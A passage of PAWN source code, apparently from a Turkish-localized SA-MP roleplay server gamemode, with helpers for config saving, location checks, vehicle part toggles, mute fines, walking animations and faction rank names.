        ObjInfo[idx][oRZ]);
        if(idx == 1)
	    {
	        file = fopen("objects22.cfg", io_write);
	    }
	    else
	    {
	    	file = fopen("objects22.cfg", io_append);
	    }
		fwrite(file, string);
		fclose(file);
		idx++;
	}
	print("Objects saved successfully.");
	return 1;
}

stock IsAtNameChange(playerid)
{
	if(IsPlayerConnected(playerid))
	{
		if(IsPlayerInRangeOfPoint(playerid, 3.0,1154.7295,-1440.2323,15.7969))
		{
			return 1;
		}
	}
	return 0;
}

stock IsAt247(playerid)
{
 	if(IsPlayerConnected(playerid))
	{
		if(IsPlayerInRangeOfPoint(playerid, 100.0, -30.875, -88.9609, 1004.53))
		{
			return 1;
		}
		else if(IsPlayerInRangeOfPoint(playerid, 10.0, -2654.2300,1526.3693,907.1797))
		{
		    return 1;
		}
		else if(IsPlayerInRangeOfPoint(playerid, 50.0, 890.66, 1429.08, -82.34))
		{
			return 1;
		}
		else if(IsPlayerInRangeOfPoint(playerid, 50.0, -29.2035, -185.1285, 1003.5469))
		{
		    return 1;
		}
		else if(IsPlayerInRangeOfPoint(playerid, 50.0, 2.0450,-29.0116,1003.5494))
		{
		    return 1;
		}
		else if(IsPlayerInRangeOfPoint(playerid, 50.0, -28.1463,-89.9533,1003.5469))
		{
		    return 1;
		}
		else if(IsPlayerInRangeOfPoint(playerid, 50.0, -22.0699,-138.6297,1003.5469))
		{
		    return 1;
		}
		else if(IsPlayerInRangeOfPoint(playerid, 50.0, -22.0699,-138.6297,1003.5469))
		{
		    return 1;
		}
		else if(IsPlayerInRangeOfPoint(playerid, 50.0, -30.9772,-29.0228,1003.5573))
		{
		    return 1;
		}
		else if(IsPlayerInRangeOfPoint(playerid, 50.0, -23.4488,-55.6319,1003.5469))
		{
		    return 1;
		}
		else if((IsPlayerInRangeOfPoint(playerid,130.0,470.430297, -2414.415527, 10.790462) && GetPlayerInterior(playerid) == 18))
		{ // Saints Mall
		    return 1;
		}
 	}
	return 0;
}

Float:GetDistanceBetweenPlayers(iPlayerOne, iPlayerTwo)
{
	new
		Float: fPlayerPos[3];

	GetPlayerPos(iPlayerOne, fPlayerPos[0], fPlayerPos[1], fPlayerPos[2]);
	return GetPlayerDistanceFromPoint(iPlayerTwo, fPlayerPos[0], fPlayerPos[1], fPlayerPos[2]);
}

stock RespawnNearbyVehicles(iplayerid, Float: fRadius) {

	new
		Float: fPlayerPos[3];

    GetPlayerPos(iplayerid, fPlayerPos[0], fPlayerPos[1], fPlayerPos[2]);
    for(new i = 1; i < MAX_VEHICLES; i++) if(GetVehicleModel(i) && GetVehicleDistanceFromPoint(i, fPlayerPos[0], fPlayerPos[1], fPlayerPos[2]) <= fRadius) {
		foreach(Player, x) if(GetPlayerVehicleID(x) == i) continue;
		SetVehicleToRespawn(i);
    }
	return 1;
}

stock DoubleEXPcheck(hour) {
    FixHour(hour);
    hour = shifthour;

	if(hour >= 13 && hour <= 15)
		return 1; // EU timezone
	else if(hour >= 18 && hour <= 20)
		return 1; // US timezone
    else if(hour >= 0 && hour <= 2)
		return 1; // OC timezone

	return 0;
}

stock Misc_Save() {

	new
		szFileStr[32],
		File: iFileHandle = fopen("serverConfig.ini", io_write);

	ini_SetInteger(iFileHandle, szFileStr, "Jackpot", Jackpot);
	ini_SetInteger(iFileHandle, szFileStr, "LoginCount", TotalLogin);
	ini_SetInteger(iFileHandle, szFileStr, "ConnCount", TotalConnect);
	ini_SetInteger(iFileHandle, szFileStr, "ABanCount", TotalAutoBan);
	ini_SetInteger(iFileHandle, szFileStr, "RegCount", TotalRegister);
	ini_SetInteger(iFileHandle, szFileStr, "MaxPCount", MaxPlayersConnected);
	ini_SetInteger(iFileHandle, szFileStr, "MaxPDay", MPDay);
	ini_SetInteger(iFileHandle, szFileStr, "MaxPMonth", MPMonth);
	ini_SetInteger(iFileHandle, szFileStr, "MaxPYear", MPYear);
	ini_SetInteger(iFileHandle, szFileStr, "Uptime", TotalUptime);
	ini_SetString(iFileHandle, "gMOTD", GlobalMOTD);
	ini_SetString(iFileHandle, "aMOTD", AdminMOTD);
	fclose(iFileHandle);
}

stock Misc_Load() {

	new
		szResult[32],
		szFileStr[160],
		File: iFileHandle = fopen("serverConfig.ini", io_read);

	while(fread(iFileHandle, szFileStr, sizeof(szFileStr))) {

		if(ini_GetValue(szFileStr, "gMOTD", GlobalMOTD, sizeof(GlobalMOTD))) 												continue;
		if(ini_GetValue(szFileStr, "aMOTD", AdminMOTD, sizeof(AdminMOTD))) 													continue;

		else if(ini_GetValue(szFileStr, "Jackpot", szResult, sizeof(szResult)))												Jackpot = strval(szResult);
		//else if(ini_GetValue(szFileStr, "Tax", szResult, sizeof(szResult)))													Tax = strval(szResult);
		//else if(ini_GetValue(szFileStr, "TaxVal", szResult, sizeof(szResult)))												TaxValue = strval(szResult);
		else if(ini_GetValue(szFileStr, "LoginCount", szResult, sizeof(szResult)))											TotalLogin = strval(szResult);
		else if(ini_GetValue(szFileStr, "ConnCount", szResult, sizeof(szResult)))											TotalConnect = strval(szResult);
		else if(ini_GetValue(szFileStr, "ABanCount", szResult, sizeof(szResult)))											TotalAutoBan = strval(szResult);
		else if(ini_GetValue(szFileStr, "RegCount", szResult, sizeof(szResult)))											TotalRegister = strval(szResult);
		else if(ini_GetValue(szFileStr, "MaxPCount", szResult, sizeof(szResult)))											MaxPlayersConnected	= strval(szResult);
		else if(ini_GetValue(szFileStr, "MaxPDay", szResult, sizeof(szResult)))												MPDay = strval(szResult);
		else if(ini_GetValue(szFileStr, "MaxPMonth", szResult, sizeof(szResult)))											MPMonth = strval(szResult);
		else if(ini_GetValue(szFileStr, "MaxPYear", szResult, sizeof(szResult)))											MPYear = strval(szResult);
		else if(ini_GetValue(szFileStr, "Uptime", szResult, sizeof(szResult)))												TotalUptime = strval(szResult);
	}
	fclose(iFileHandle);
}

ini_GetValue(szParse[], szValueName[], szDest[], iDestLen)
{

	new
		iPos = strfind(szParse, "=", false),
		iLength = strlen(szParse);

	while(iLength-- && szParse[iLength] <= ' ')
	{
		szParse[iLength] = 0;
	}

	if(strcmp(szParse, szValueName, false, iPos) == 0)
	{
		strmid(szDest, szParse, iPos + 1, iLength + 1, iDestLen);
		return 1;
	}
	return 0;
}

stock SetVehicleLights(vehicleid, playerid)
{
    GetVehicleParamsEx(vehicleid,engine,lights,alarm,doors,bonnet,boot,objective);
    if(lights == VEHICLE_PARAMS_ON)
	{
		SetVehicleParamsEx(vehicleid,engine,VEHICLE_PARAMS_OFF,alarm,doors,bonnet,boot,objective);
		SendClientMessage(playerid, COLOR_WHITE, "Aracýn farlarý kapandý.");
	}
    else if(lights == VEHICLE_PARAMS_OFF || lights == VEHICLE_PARAMS_UNSET)
	{
		SetVehicleParamsEx(vehicleid,engine,VEHICLE_PARAMS_ON,alarm,doors,bonnet,boot,objective);
		SendClientMessage(playerid, COLOR_WHITE, "Aracýn farlarý açýldý.");
	}
	return 1;
}

stock SetVehicleTrunk(vehicleid, playerid)
{
    GetVehicleParamsEx(vehicleid,engine,lights,alarm,doors,bonnet,boot,objective);
    if(boot == VEHICLE_PARAMS_ON)
	{
		SetVehicleParamsEx(vehicleid,engine,lights,alarm,doors,bonnet,VEHICLE_PARAMS_OFF,objective);
		SendClientMessage(playerid, COLOR_WHITE, "Aracýn bagajý kapandý.");
	}
    else if(boot == VEHICLE_PARAMS_OFF || boot == VEHICLE_PARAMS_UNSET)
	{
		SetVehicleParamsEx(vehicleid,engine,lights,alarm,doors,bonnet,VEHICLE_PARAMS_ON,objective);
		SendClientMessage(playerid, COLOR_WHITE, "Aracýn bagajý açýldý.");
	}
	return 1;
}

stock SetVehicleHood(vehicleid, playerid)
{
    GetVehicleParamsEx(vehicleid,engine,lights,alarm,doors,bonnet,boot,objective);
    if(bonnet == VEHICLE_PARAMS_ON)
	{
		SetVehicleParamsEx(vehicleid,engine,lights,alarm,doors,VEHICLE_PARAMS_OFF,boot,objective);
		SendClientMessage(playerid, COLOR_WHITE, "Aracýn kaputu kapandý.");
	}
    else if(bonnet == VEHICLE_PARAMS_OFF || bonnet == VEHICLE_PARAMS_UNSET)
	{
		SetVehicleParamsEx(vehicleid,engine,lights,alarm,doors,VEHICLE_PARAMS_ON,boot,objective);
		SendClientMessage(playerid, COLOR_WHITE, "Aracýn kaputu açýldý.");
	}
	return 1;
}

stock ShowNMuteFine(playerid)
{
	new playername[MAX_PLAYER_NAME];
	GetPlayerName(playerid, playername, sizeof(playername));

	new allmoney;
	if(PlayerInfo[playerid][pHouse] != INVALID_HOUSE_ID && strcmp(GetPlayerNameEx(playerid), HouseInfo[PlayerInfo[playerid][pHouse]][hOwner], true) == 0)
	{
		allmoney = HouseInfo[PlayerInfo[playerid][pHouse]][hSafeMoney]+GetPlayerCash(playerid)+PlayerInfo[playerid][pBank];
	}
	else if(PlayerInfo[playerid][pHouse2] != INVALID_HOUSE_ID && strcmp(GetPlayerNameEx(playerid), HouseInfo[PlayerInfo[playerid][pHouse2]][hOwner], true) == 0)
	{
		allmoney += HouseInfo[PlayerInfo[playerid][pHouse2]][hSafeMoney];
	}
	else
	{
		allmoney = GetPlayerCash(playerid)+PlayerInfo[playerid][pBank];
	}

    new fine = 10*allmoney/100;
	if(PlayerInfo[playerid][pNMuteTotal] < 4)
	{
		new string[64];
		format(string,sizeof(string),"%d Dakika Hapis\nPara Cezasý ($%d)",PlayerInfo[playerid][pNMuteTotal] * 15, fine);
		ShowPlayerDialogEx(playerid,NMUTE,DIALOG_STYLE_LIST,"Newbie Kanalý Mute Kaldýr - Cezaný Seç:",string,"Seç","Iptal");
	}
	else if(PlayerInfo[playerid][pNMuteTotal] == 4) ShowPlayerDialogEx(playerid,NMUTE,DIALOG_STYLE_LIST,"Newbie Kanalý Mute Kaldýr - Cezaný Seç:","1 Saat Hapis","Seç","Iptal");
	else if(PlayerInfo[playerid][pNMuteTotal] == 5) ShowPlayerDialogEx(playerid,NMUTE,DIALOG_STYLE_LIST,"Newbie Kanalý Mute Kaldýr - Cezaný Seç:","1 Saat 15 Dakika Hapis","Seç","Iptal");
	else if(PlayerInfo[playerid][pNMuteTotal] == 6) ShowPlayerDialogEx(playerid,NMUTE,DIALOG_STYLE_LIST,"Newbie Kanalý Mute Kaldýr - Cezaný Seç:","1 Saat 30 Dakika Hapis","Seç","Iptal");
}

stock ShowAdMuteFine(playerid)
{
	new string[128];
	new playername[MAX_PLAYER_NAME];
	GetPlayerName(playerid, playername, sizeof(playername));

	new allmoney;
	if(PlayerInfo[playerid][pHouse] != INVALID_HOUSE_ID && strcmp(GetPlayerNameEx(playerid), HouseInfo[PlayerInfo[playerid][pHouse]][hOwner], true) == 0)
	{
		allmoney = HouseInfo[PlayerInfo[playerid][pHouse]][hSafeMoney]+GetPlayerCash(playerid)+PlayerInfo[playerid][pBank];
	}
	else if(PlayerInfo[playerid][pHouse2] != INVALID_HOUSE_ID && strcmp(GetPlayerNameEx(playerid), HouseInfo[PlayerInfo[playerid][pHouse2]][hOwner], true) == 0)
	{
		allmoney += HouseInfo[PlayerInfo[playerid][pHouse2]][hSafeMoney];
	}
	else
	{
		allmoney = GetPlayerCash(playerid)+PlayerInfo[playerid][pBank];
	}

    new fine = 10*allmoney/100;
	if(PlayerInfo[playerid][pADMuteTotal] < 4)
	{
		format(string,sizeof(string),"%d Dakika Hapis\nPara Cezasý ($%d)",PlayerInfo[playerid][pADMuteTotal]*15,fine);
	}
	if(PlayerInfo[playerid][pADMuteTotal] == 4)
	{
	    format(string,sizeof(string),"1 Saat Hapis");
	}
	if(PlayerInfo[playerid][pADMuteTotal] == 5)
	{
	    format(string,sizeof(string),"1 Saat 15 Dakika Hapis)");
	}
	if(PlayerInfo[playerid][pADMuteTotal] == 6)
	{
	    format(string,sizeof(string),"1 Saat 30 Dakika Hapis");
	}
	ShowPlayerDialogEx(playerid,ADMUTE,DIALOG_STYLE_LIST,"Reklam Mute Kaldýr - Cezaný Seç:",string,"Seç","Iptal");
}

stock FindFreeAttachedObjectSlot(playerid)
{
	new index;
 	while (index < MAX_PLAYER_ATTOBJECTS && IsPlayerAttachedObjectSlotUsed(playerid, index))
	{
		index++;
	}
	if(index == MAX_PLAYER_ATTOBJECTS) return -1;
	return index;
}

stock player_remove_vip_toys(iTargetID)
{
	if(PlayerInfo[iTargetID][pDonator] >= 3) return 1;
	else for(new iToyIter; iToyIter < MAX_PLAYER_ATTOBJECTS; ++iToyIter) {
		for(new LoopRapist; LoopRapist < sizeof(HoldingObjectsCop); ++LoopRapist) {
			if(HoldingObjectsCop[LoopRapist][holdingmodelid] == PlayerToyInfo[iTargetID][iToyIter][ptModelID]) {
				new
					szQuery[128];

				SetPVarInt(iTargetID, "deleteObject", iToyIter);
				format(szQuery, sizeof(szQuery), "DELETE FROM toys WHERE Owner = %d AND ID = %d", PlayerInfo[iTargetID][pID], PlayerToyInfo[iTargetID][iToyIter][ptRealID]);
				mysql_query(szQuery, THREAD_DELETE_PLAYER_OBJECT, iTargetID, g_MySQLConnections[0]);
				if(IsPlayerAttachedObjectSlotUsed(iTargetID, iToyIter)) RemovePlayerAttachedObject(iTargetID, iToyIter);
			}
		}
	}
	SendClientMessage(iTargetID, COLOR_WHITE, "Çalýþanýnýn malý olan tüm aksesuarlar kaldýrýldý.");
	return 1;
}

stock SetPlayerWalkingStyle(playerid, style)
{
	PlayerInfo[playerid][pWalkStyle] = style;
}

stock GetPlayerWalkingStyle(playerid)
{
	return PlayerInfo[playerid][pWalkStyle];
}

forward WalkAnim(playerid);
public WalkAnim(playerid)
{
	new keys, updown, leftright;
	GetPlayerKeys(playerid,keys,updown,leftright);
	if (GetPlayerWalkingStyle(playerid) == WALK_NORMAL)
	{
 	 	if ((keys & KEY_WALK && updown & KEY_UP) || (keys & KEY_WALK && updown & KEY_DOWN) || (keys & KEY_WALK && leftright & KEY_LEFT) || (keys & KEY_WALK && leftright & KEY_RIGHT))
		{
		   	KillTimer(walktime[playerid]);
			ApplyAnimation(playerid,"PED","WALK_player",4.1,1,1,1,1,1);
			walktime[playerid] = SetTimerEx("WalkAnim",200,0,"d",playerid);
		}
		else ApplyAnimation(playerid,"PED","WALK_player",4.0,0,0,0,0,1), KillTimer(walktime[playerid]);
	}
	else if (GetPlayerWalkingStyle(playerid) == WALK_PED)
	{
 	 	if ((keys & KEY_WALK && updown & KEY_UP) || (keys & KEY_WALK && updown & KEY_DOWN) || (keys & KEY_WALK && leftright & KEY_LEFT) || (keys & KEY_WALK && leftright & KEY_RIGHT))
		{
		   	KillTimer(walktime[playerid]);
			ApplyAnimation(playerid,"PED","WALK_civi",4.1,1,1,1,1,1);
			walktime[playerid] = SetTimerEx("WalkAnim",200,0,"d",playerid);
		}
		else ApplyAnimation(playerid,"PED","WALK_civi",4.0,0,0,0,0,1), KillTimer(walktime[playerid]);
	}
 	else if (GetPlayerWalkingStyle(playerid) == WALK_GANGSTA)
	{
 	 	if ((keys & KEY_WALK && updown & KEY_UP) || (keys & KEY_WALK && updown & KEY_DOWN) || (keys & KEY_WALK && leftright & KEY_LEFT) || (keys & KEY_WALK && leftright & KEY_RIGHT))
		{
		   	KillTimer(walktime[playerid]);
			ApplyAnimation(playerid,"PED","WALK_gang1",4.1,1,1,1,1,1);
			walktime[playerid] = SetTimerEx("WalkAnim",200,0,"d",playerid);
		}
		else ApplyAnimation(playerid,"PED","WALK_gang1",4.0,0,0,0,0,1), KillTimer(walktime[playerid]);
	}
	else if (GetPlayerWalkingStyle(playerid) == WALK_GANGSTA2)
	{
 	 	if ((keys & KEY_WALK && updown & KEY_UP) || (keys & KEY_WALK && updown & KEY_DOWN) || (keys & KEY_WALK && leftright & KEY_LEFT) || (keys & KEY_WALK && leftright & KEY_RIGHT))
		{
		   	KillTimer(walktime[playerid]);
			ApplyAnimation(playerid,"PED","WALK_gang2",4.1,1,1,1,1,1);
			walktime[playerid] = SetTimerEx("WalkAnim",200,0,"d",playerid);
		}
		else ApplyAnimation(playerid,"PED","WALK_gang2",4.0,0,0,0,0,1), KillTimer(walktime[playerid]);
	}
	else if (GetPlayerWalkingStyle(playerid) == WALK_OLD)
	{
 	 	if ((keys & KEY_WALK && updown & KEY_UP) || (keys & KEY_WALK && updown & KEY_DOWN) || (keys & KEY_WALK && leftright & KEY_LEFT) || (keys & KEY_WALK && leftright & KEY_RIGHT))
		{
		   	KillTimer(walktime[playerid]);
			ApplyAnimation(playerid,"PED","WALK_old",4.1,1,1,1,1,1);
			walktime[playerid] = SetTimerEx("WalkAnim",200,0,"d",playerid);
		}
		else ApplyAnimation(playerid,"PED","WALK_old",4.0,0,0,0,0,1), KillTimer(walktime[playerid]);
	}
	else if (GetPlayerWalkingStyle(playerid) == WALK_FAT_OLD)
	{
 	 	if ((keys & KEY_WALK && updown & KEY_UP) || (keys & KEY_WALK && updown & KEY_DOWN) || (keys & KEY_WALK && leftright & KEY_LEFT) || (keys & KEY_WALK && leftright & KEY_RIGHT))
		{
		   	KillTimer(walktime[playerid]);
			ApplyAnimation(playerid,"PED","WALK_fatold",4.1,1,1,1,1,1);
			walktime[playerid] = SetTimerEx("WalkAnim",200,0,"d",playerid);
		}
		else ApplyAnimation(playerid,"PED","WALK_fatold",4.0,0,0,0,0,1), KillTimer(walktime[playerid]);
	}
	else if (GetPlayerWalkingStyle(playerid) == WALK_FAT)
	{
 	 	if ((keys & KEY_WALK && updown & KEY_UP) || (keys & KEY_WALK && updown & KEY_DOWN) || (keys & KEY_WALK && leftright & KEY_LEFT) || (keys & KEY_WALK && leftright & KEY_RIGHT))
		{
		   	KillTimer(walktime[playerid]);
			ApplyAnimation(playerid,"PED","WALK_fat",4.1,1,1,1,1,1);
			walktime[playerid] = SetTimerEx("WalkAnim",200,0,"d",playerid);
		}
		else ApplyAnimation(playerid,"PED","WALK_fat",4.0,0,0,0,0,1), KillTimer(walktime[playerid]);
	}
	else if (GetPlayerWalkingStyle(playerid) == WALK_LADY)
	{
 	 	if ((keys & KEY_WALK && updown & KEY_UP) || (keys & KEY_WALK && updown & KEY_DOWN) || (keys & KEY_WALK && leftright & KEY_LEFT) || (keys & KEY_WALK && leftright & KEY_RIGHT))
		{
		   	KillTimer(walktime[playerid]);
			ApplyAnimation(playerid,"PED","WOMAN_walknorm",4.1,1,1,1,1,1);
			walktime[playerid] = SetTimerEx("WalkAnim",200,0,"d",playerid);
		}
		else ApplyAnimation(playerid,"PED","WOMAN_walknorm",4.0,0,0,0,0,1), KillTimer(walktime[playerid]);
	}
	else if (GetPlayerWalkingStyle(playerid) == WALK_LADY2)
	{
 	 	if ((keys & KEY_WALK && updown & KEY_UP) || (keys & KEY_WALK && updown & KEY_DOWN) || (keys & KEY_WALK && leftright & KEY_LEFT) || (keys & KEY_WALK && leftright & KEY_RIGHT))
		{
		   	KillTimer(walktime[playerid]);
			ApplyAnimation(playerid,"PED","WOMAN_walkbusy",4.1,1,1,1,1,1);
			walktime[playerid] = SetTimerEx("WalkAnim",200,0,"d",playerid);
		}
		else ApplyAnimation(playerid,"PED","WOMAN_walkbusy",4.0,0,0,0,0,1), KillTimer(walktime[playerid]);
	}
	else if (GetPlayerWalkingStyle(playerid) == WALK_WHORE)
	{
 	 	if ((keys & KEY_WALK && updown & KEY_UP) || (keys & KEY_WALK && updown & KEY_DOWN) || (keys & KEY_WALK && leftright & KEY_LEFT) || (keys & KEY_WALK && leftright & KEY_RIGHT))
		{
		   	KillTimer(walktime[playerid]);
			ApplyAnimation(playerid,"PED","WOMAN_walkpro",4.1,1,1,1,1,1);
			walktime[playerid] = SetTimerEx("WalkAnim",200,0,"d",playerid);
		}
		else ApplyAnimation(playerid,"PED","WOMAN_walkpro",4.0,0,0,0,0,1), KillTimer(walktime[playerid]);
	}
	else if (GetPlayerWalkingStyle(playerid) == WALK_WHORE2)
	{
 	 	if ((keys & KEY_WALK && updown & KEY_UP) || (keys & KEY_WALK && updown & KEY_DOWN) || (keys & KEY_WALK && leftright & KEY_LEFT) || (keys & KEY_WALK && leftright & KEY_RIGHT))
		{
		   	KillTimer(walktime[playerid]);
			ApplyAnimation(playerid,"PED","WOMAN_walksexy",4.1,1,1,1,1,1);
			walktime[playerid] = SetTimerEx("WalkAnim",200,0,"d",playerid);
		}
		else ApplyAnimation(playerid,"PED","WOMAN_walksexy",4.0,0,0,0,0,1), KillTimer(walktime[playerid]);
	}
	else if (GetPlayerWalkingStyle(playerid) == WALK_DRUNK)
	{
 	 	if ((keys & KEY_WALK && updown & KEY_UP) || (keys & KEY_WALK && updown & KEY_DOWN) || (keys & KEY_WALK && leftright & KEY_LEFT) || (keys & KEY_WALK && leftright & KEY_RIGHT))
		{
		   	KillTimer(walktime[playerid]);
			ApplyAnimation(playerid,"PED","WALK_drunk",4.1,1,1,1,1,1);
			walktime[playerid] = SetTimerEx("WalkAnim",200,0,"d",playerid);
		}
		else ApplyAnimation(playerid,"PED","WALK_drunk",4.0,0,0,0,0,1), KillTimer(walktime[playerid]);
	}
	else if (GetPlayerWalkingStyle(playerid) == WALK_BLIND)
	{
 	 	if ((keys & KEY_WALK && updown & KEY_UP) || (keys & KEY_WALK && updown & KEY_DOWN) || (keys & KEY_WALK && leftright & KEY_LEFT) || (keys & KEY_WALK && leftright & KEY_RIGHT))
		{
		   	KillTimer(walktime[playerid]);
			ApplyAnimation(playerid,"PED","Walk_Wuzi",4.1,1,1,1,1,1);
			walktime[playerid] = SetTimerEx("WalkAnim",200,0,"d",playerid);
		}
		else ApplyAnimation(playerid,"PED","Walk_Wuzi",4.0,0,0,0,0,1), KillTimer(walktime[playerid]);
	}
	return true;
}

stock Float:GetDistance(Float: x1, Float: y1, Float: z1, Float: x2, Float: y2, Float: z2)
{
	new Float:d;
	d += floatpower(x1-x2, 2.0);
	d += floatpower(y1-y2, 2.0);
	d += floatpower(z1-z2, 2.0);
	d = floatsqroot(d);
	return d;
}

stock Float: GetDistanceToCar(playerid, veh) {

	new
		Float: fVehiclePos[3];

	GetVehiclePos(veh, fVehiclePos[0], fVehiclePos[1], fVehiclePos[2]);
	return GetPlayerDistanceFromPoint(playerid, fVehiclePos[0], fVehiclePos[1], fVehiclePos[2]);
}

stock GetClosestCar(iPlayer, iException = INVALID_VEHICLE_ID, Float: fRange = Float: 0x7F800000) {

	new
		iReturnID = -1,
		Float: fVehiclePos[4];

	for(new i = 1; i <= MAX_VEHICLES; ++i) if(GetVehicleModel(i) && i != iException) {
		GetVehiclePos(i, fVehiclePos[0], fVehiclePos[1], fVehiclePos[2]);
		if((fVehiclePos[3] = GetPlayerDistanceFromPoint(iPlayer, fVehiclePos[0], fVehiclePos[1], fVehiclePos[2])) < fRange) {
			fRange = fVehiclePos[3];
			iReturnID = i;
		}
	}
	return iReturnID;
}

stock GetFactionName(factionid) {
	new
		employer[64];
	switch(factionid) {
		case 1: employer = "LSPD";
		case 2: employer = "FBI";
		case 3: employer = "LSFMD";
		case 4: employer = "Hitman Ajansý";
		case 5: employer = "Devlet";
  		case 6: employer = "LST";
		case 9: employer = "SA Haberleri";
	}
	return employer;
}

forward ResyncPlayer(playerid);
public ResyncPlayer(playerid) {
	#define RESYNC_TIME (1000) // MS

	if(GetPVarInt(playerid, "_resync") != 0) {
	    GameTextForPlayer(playerid, "~r~ Senkronize Oluyor...", RESYNC_TIME, 5);
		SetPVarInt(playerid, "_tmpVW", GetPlayerVirtualWorld(playerid));
		SetPVarInt(playerid, "_resync", 1);
		SetPlayerVirtualWorld(playerid, TEMP_RESYNC_VW);
		SetTimerEx("ResyncPlayer", RESYNC_TIME, false, "d", playerid);
	} else {
	    SetPlayerVirtualWorld(playerid, GetPVarInt(playerid, "_tmpVW"));
	    DeletePVar(playerid, "_resync");
	    DeletePVar(playerid, "_tmpVW");
	}
	return 1;
}

stock GetPlayerFactionInfo(targetid, rank[64], division[64], employer[64]) { // >>> UPDATE FACTION NAMES FROM GetFactionName <<<
	switch(PlayerInfo[targetid][pFaction]) { // employer/rank/division data is pulled from here
	    case 1: {
            employer = "LSPD";
			switch(PlayerInfo[targetid][pRank]) {
			    case 1: rank = "Memur";
			    case 2: rank = "Kýdemli Memur";
			    case 3: rank = "Çavuþ";
			    case 4: rank = "Teðmen";
			    case 5: rank = "Asistan Þef";
			    case 6: rank = "Þef";
			    default: rank = "Stajyer";
			}
			switch(PlayerInfo[targetid][pDivision]) {
			    case 1: division = "Yok";
			    case 2: division = "DET";
			    case 3: division = "PTL";
			    case 4: division = "FTO";
			    case 5: division = "SWAT";
			    case 6: division = "IA";
			    default: division = "Yok";
			}
		}
  		case 2: {
            employer = "FBI";
			switch(PlayerInfo[targetid][pRank]) {
			    case 1: rank = "Ajan";
			    case 2: rank = "Kýdemli Ajan";
			    case 3: rank = "Uzman Ajan";
			    case 4: rank = "Denetleyici Ajan";
			    case 5: rank = "Asistan Direktör";
			    case 6: rank = "Direktör";
			    default: rank = "Yeni Ajan";
			}
			switch(PlayerInfo[targetid][pDivision]) {
			    case 1: division = "Yok";
			    case 2: division = "GU";
			    case 3: division = "FAN";
			    case 4: division = "CID";
			    case 5: division = "IA";
				case 6: division = "NSB";
			    default: division = "Yok";
			}
		}
  		case 3: {
            employer = "LSFMD";

			switch(PlayerInfo[targetid][pRank]) {
				case 0: rank = "Pretisyen Hekim";
				case 1: rank = "Asistan Doktor";
				case 2: rank = "Doktor";
				case 3: rank = "Prof. Doktor";
				case 4: rank = "Prof. Doktor";
				case 5: rank = "Baþhekim";
				case 6: rank = "Þef";
				default: rank = "Pretisyen Hekim";
			}

			switch(PlayerInfo[targetid][pDivision]) {
			    case 1: division = "T&R";
			    case 2: division = "LF";
				case 3: division = "FD";
				case 4: division = "I&A";
			    default: division = "Yok";
			}
		}
		case 4: {
		    employer = "Hitman Ajansý";
		    switch(PlayerInfo[targetid][pRank])
		    {
    			case 1: rank = "Katil";
				case 2: rank = "Niþancý";
				case 3: rank = "Ajan";
				case 4: rank = "Özel Ajan";
				case 5: rank = "Asistan Direktör";
				case 6: rank = "Direktör";
				default: rank = "Katil";
			}
			division = "Yok";
		}
		case 5: {
		    employer = "Devlet";
		    switch(PlayerInfo[targetid][pRank]) {
				case 1: {
					if(PlayerInfo[targetid][pDivision] == 5)
						rank = "Çalýþan";
					else
					    rank = "Çalýþan";
				}
				case 2: {
					if(PlayerInfo[targetid][pDivision] == 5)
						rank = "Meclis";
					else
					    rank = "Meclis";
				}
				case 3: {
					if(PlayerInfo[targetid][pDivision] == 5)
						rank = "Milletvekili";
					else
					    rank = "Milletvekili";
				}
				case 4: {
					if(PlayerInfo[targetid][pDivision] == 5)
						rank = "Vali";
					else
					    rank = "Vali";
				}
				case 5: {
					if(PlayerInfo[targetid][pDivision] == 5)
						rank = "Baþkan Yardýmcýsý";
					else
					    rank = "Baþkan Yardýmcýsý";
				}
				case 6: rank = "Baþkan";
				default: rank = "Çalýþan";
			}

			division = "Yok";
			switch(PlayerInfo[targetid][pDivision]) {
				case 1: division = "Yok";
			    case 2: division = "Idari";
			    case 3: division = "Adli";
			    case 4: division = "Kanuni";
			    case 5: division = "GS";
			    default: division = "Yok";
			}
		}
  		case 6: {
		    employer = "Los Santos Taxi";
		    switch(PlayerInfo[targetid][pRank])
		    {
    			case 1: rank = "Acemi Þoför";
				case 2: rank = "Þoför";
				case 3: rank = "Deneyimli Þoför";
				case 4: rank = "Durak Yardýmcýsý";
				case 5: rank = "Durak Baþyardýmcýsý";
				case 6: rank = "Durak Sahibi";
				default: rank = "Acemi Þoför";
			}
			division = "Yok";
		}
		case 9: {
		    employer = "SA Haberleri";
		    switch(PlayerInfo[targetid][pRank]) {
				case 1: rank = "Sunucu";
				case 2: rank = "Sekreter";
				case 3: rank = "Personel Þefi";
				case 4: rank = "Müdür";
				case 5: rank = "Genel Müdür";
				case 6: rank = "Yönetim Kurulu Baþkaný";
				default: rank = "Araþtýrmacý Gazeteci";
			}

			division = "Yok";
			switch(PlayerInfo[targetid][pDivision]) {
			    case 1: division = "Güvenlik";
			    default: division = "";
			}
		}
	    default: { employer = "Yok"; division = "Yok"; rank = "Yok"; }
	}
	return 1;
}

stock IsAVipCar(carid)
{
	for(new v = 0; v < sizeof(VipVehicles); v++) {
	    if(carid == VipVehicles[v]) return 1;
	}
	return 0;
}

stock IsACopCar(carid)
{
	for(new v = 0; v < sizeof(LSPDVehicles); v++) {
	    if(carid == LSPDVehicles[v]) return 1;
	}
	return 0;
}

stock IsAFBICar(carid)
{
	for(new v = 0; v < sizeof(FBIVehicles); v++) {
	    if(carid == FBIVehicles[v]) return 1;
	}
	return 0;
}

stock IsAnAmbulance(carid)
{
	for(new v = 0; v < sizeof(LSFMDVehicles); v++) {
	    if(carid == LSFMDVehicles[v]) return 1;
	}
	return 0;
}

stock IsANewsVeh(vehid) {
	for(new v = 0; v < sizeof(SANVehicles); v++) {
	    if(vehid == SANVehicles[v]) return 1;
	}
	return 0;
}

stock IsAGovCar(carid)
{
	for(new v = 0; v < sizeof(GovVehicles); v++) {
	    if(carid == GovVehicles[v]) return 1;
	}
	return 0;
}

stock IsACop(playerid) {
	if(PlayerInfo[playerid][pLeader] == 1 || PlayerInfo[playerid][pLeader] == 2 || PlayerInfo[playerid][pFaction] == 1 || PlayerInfo[playerid][pFaction] == 2) return 1;
	else return 0;
}

stock IsInLSFMD(playerid) {
	if(PlayerInfo[playerid][pLeader] == 3 || PlayerInfo[playerid][pFaction] == 3) return 1;
	else return 0;
}

stock IsAtDeliverPatientPoint(playerid)
{
	if(IsPlayerConnected(playerid))
	{
